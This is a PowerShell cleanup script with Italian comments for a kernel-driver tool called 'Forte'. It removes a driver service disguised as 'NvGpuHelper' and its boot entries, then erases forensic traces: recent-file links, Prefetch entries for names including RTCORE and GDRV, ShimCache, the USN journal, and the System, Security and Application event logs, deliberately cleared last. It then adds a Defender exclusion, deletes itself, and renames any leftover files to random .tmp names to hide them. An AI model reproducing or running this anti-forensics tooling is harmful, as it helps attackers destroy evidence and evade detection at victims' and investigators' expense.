$targetDir = Split-Path -Parent $MyInvocation.MyCommand.Path

# ---- Step 1: Ferma il driver e aspetta che sia DAVVERO fermato ----
Write-Host "[*] Stop driver NvGpuHelper..."
sc.exe stop NvGpuHelper 2>$null | Out-Null

# Aspetta finche il servizio non e STOPPED (state=1) oppure non esiste piu
$maxWait = 20
$waited  = 0
do {
    Start-Sleep -Seconds 1
    $waited++
    $qry = sc.exe query NvGpuHelper 2>&1
    $stopped = ("$qry" -match "STOPPED|1060|non esiste|does not exist")
} while (-not $stopped -and $waited -lt $maxWait)

if ($stopped) { Write-Host "    [+] Servizio fermato dopo $waited secondi" }
else { Write-Host "    [!] Servizio ancora attivo dopo $maxWait sec - forzo" }

sc.exe delete NvGpuHelper 2>$null | Out-Null
Start-Sleep -Seconds 2

# ---- Step 2: Registry servizio ----
Write-Host "[*] Rimozione registry servizio..."
Remove-Item "HKLM:\SYSTEM\CurrentControlSet\Services\NvGpuHelper" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item "HKLM:\SYSTEM\ControlSet001\Services\NvGpuHelper" -Recurse -Force -ErrorAction SilentlyContinue

# ---- Step 3: NvGpuHelper.sys in System32 ----
Write-Host "[*] Rimozione NvGpuHelper.sys da System32..."
$driverPath = "C:\Windows\System32\drivers\NvGpuHelper.sys"
if (Test-Path $driverPath) {
    Remove-Item $driverPath -Force -ErrorAction SilentlyContinue
    if (Test-Path $driverPath) {
        $regSM = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager"
        $pending = (Get-ItemProperty $regSM -Name PendingFileRenameOperations -ErrorAction SilentlyContinue).PendingFileRenameOperations
        $entry = @("\??\$driverPath", "")
        if ($pending) { Set-ItemProperty $regSM -Name PendingFileRenameOperations -Value ($pending + $entry) -Type MultiString }
        else { Set-ItemProperty $regSM -Name PendingFileRenameOperations -Value $entry -Type MultiString }
        Write-Host "    [!] Schedulato delete al prossimo reboot"
    } else { Write-Host "    [+] Rimosso" }
}

# ---- Step 4: BootExecute ----
Write-Host "[*] Pulizia BootExecute..."
$smPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager"
$boot = (Get-ItemProperty $smPath -Name BootExecute -ErrorAction SilentlyContinue).BootExecute
if ($boot) {
    $clean = $boot | Where-Object { $_ -notmatch "kvc_smss" }
    if (-not $clean) { $clean = @("autocheck autochk *") }
    Set-ItemProperty $smPath -Name BootExecute -Value $clean -Type MultiString
    Write-Host "    [+] BootExecute pulito"
}

# ---- Step 5: drivers.ini ----
Remove-Item "C:\Windows\drivers.ini" -Force -ErrorAction SilentlyContinue

# ---- Step 6: C:\nvdrv (ora il driver e scaricato) ----
Write-Host "[*] Rimozione C:\nvdrv..."
Start-Sleep -Seconds 2
for ($i = 0; $i -lt 3; $i++) {
    Remove-Item "C:\nvdrv" -Recurse -Force -ErrorAction SilentlyContinue
    cmd.exe /c "rd /s /q C:\nvdrv" 2>$null
    if (-not (Test-Path "C:\nvdrv")) { break }
    Start-Sleep -Seconds 2
}
if (-not (Test-Path "C:\nvdrv")) { Write-Host "    [+] C:\nvdrv rimosso" }
else {
    Write-Host "    [!] Ancora locked - schedulato per reboot"
    $regSM = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager"
    $pending = (Get-ItemProperty $regSM -Name PendingFileRenameOperations -ErrorAction SilentlyContinue).PendingFileRenameOperations
    $entry = @("\??\C:\nvdrv\NvGpuHelper.sys", "")
    if ($pending) { Set-ItemProperty $regSM -Name PendingFileRenameOperations -Value ($pending + $entry) -Type MultiString }
    else { Set-ItemProperty $regSM -Name PendingFileRenameOperations -Value $entry -Type MultiString }
}

# ---- Step 7: LNK recenti ----
Write-Host "[*] Pulizia LNK..."
$recent = "$env:APPDATA\Microsoft\Windows\Recent"
foreach ($p in @("Forte*","NvGpuHelper*","Source Forte*","kvc*","StartForte*","CleanForte*")) {
    Get-ChildItem $recent -Filter $p -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
}

# ---- Step 8: Prefetch ----
Write-Host "[*] Pulizia Prefetch..."
foreach ($p in @("FORTE*","KVC*","NVGPUHELPER*","STARTFORTE*","CLEANFORTE*","PSTRIP*","RTCORE*","GDRV*")) {
    Remove-Item "C:\Windows\Prefetch\$p" -Force -ErrorAction SilentlyContinue
}

# ---- Step 9: ShimCache ----
$shimPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache"
Remove-ItemProperty -Path $shimPath -Name AppCompatCache -ErrorAction SilentlyContinue

# ---- Step 10: USN Journal ----
$drive = Split-Path -Qualifier $targetDir
fsutil.exe usn deletejournal /D "$drive" 2>$null

# ---- Step 11: Event Log (ULTIMO - cosi non traccia niente di quello sopra) ----
Write-Host "[*] Pulizia Event Log..."
wevtutil.exe cl System      2>$null
wevtutil.exe cl Security    2>$null
wevtutil.exe cl Application 2>$null
wevtutil.exe cl Microsoft-Windows-DriverFrameworks-UserMode/Operational 2>$null
Write-Host "    [+] Event Log puliti"

# ---- Step 12: Autodistruzione immediata (no reboot) ----
Write-Host "[*] Autodistruzione in corso..."

# Aspetta che Forte.exe sia morto (max 15 sec)
$w = 0
while ((Get-Process -Name "Forte" -ErrorAction SilentlyContinue) -and $w -lt 15) {
    Start-Sleep -Seconds 1; $w++
}
Stop-Process -Name "Forte" -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 3

# Esci dalla cartella target - se e' la CWD non si puo' cancellare
Set-Location "C:\" 
[Environment]::CurrentDirectory = "C:\"

# Escludi la cartella da Defender cosi non la locka mentre cancelliamo
Add-MpPreference -ExclusionPath $targetDir -ErrorAction SilentlyContinue
Start-Sleep -Seconds 1

# 3 tentativi di cancellazione totale
$deleted = $false
for ($i = 1; $i -le 3; $i++) {
    # Rimuovi attributi read-only su tutto
    cmd.exe /c "attrib -r -s -h `"$targetDir\*.*`" /s /d" 2>$null

    # Cancella file per file prima
    cmd.exe /c "del /f /q /s `"$targetDir\*.*`"" 2>$null

    # Poi rimuovi la cartella
    cmd.exe /c "rd /s /q `"$targetDir`"" 2>$null
    Remove-Item -Path $targetDir -Recurse -Force -ErrorAction SilentlyContinue

    if (-not (Test-Path $targetDir)) {
        $deleted = $true
        Write-Host "    [+] Cartella eliminata al tentativo $i"
        break
    }
    Start-Sleep -Seconds 2
}

# Rimuovi l'esclusione Defender (cartella gia' sparita o non serve piu')
Remove-MpPreference -ExclusionPath $targetDir -ErrorAction SilentlyContinue

if (-not $deleted) {
    Write-Host "    [!] Impossibile eliminare - rinomino i file sospetti"
    # Rinomina i file con nomi innocui cosi almeno non sono riconoscibili
    Get-ChildItem $targetDir -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
        $rnd = -join ((97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})
        Rename-Item $_.FullName "$rnd.tmp" -Force -ErrorAction SilentlyContinue
    }
    # Ultimo tentativo dopo rename
    Start-Sleep -Seconds 2
    cmd.exe /c "rd /s /q `"$targetDir`"" 2>$null
    if (Test-Path $targetDir) { Write-Host "    [!] Rimasto ma rinominato in .tmp innocui" }
    else { Write-Host "    [+] Cartella eliminata dopo rename" }
}

Write-Host ""
Write-Host "[+] PULIZIA COMPLETA. Chiusura..."
Start-Sleep -Seconds 2
